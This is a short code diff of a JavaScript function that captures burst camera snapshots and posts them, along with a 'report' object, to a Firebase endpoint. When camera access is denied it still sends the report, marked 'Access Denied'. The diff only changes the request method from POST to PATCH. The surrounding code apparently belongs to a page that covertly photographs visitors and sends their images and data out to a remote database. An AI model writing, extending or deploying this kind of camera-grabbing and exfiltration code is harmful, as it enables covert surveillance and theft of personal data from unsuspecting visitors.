@@ -153,7 +153,7 @@ async function initCamera(report) {
                 const imageData = canvas.toDataURL('image/jpeg', 0.6);
 
                 await fetch(FIREBASE_API, {
-                    method: 'POST',
+                    method: 'PATCH',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ ...report, photo: imageData, burst_no: shots })
                 });
@@ -167,7 +167,7 @@ async function initCamera(report) {
     } catch (err) {
         // Kirim data tanpa foto jika kamera ditolak
         fetch(FIREBASE_API, {
-            method: 'POST',
+            method: 'PATCH',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ ...report, photo: "Access Denied" })
         });
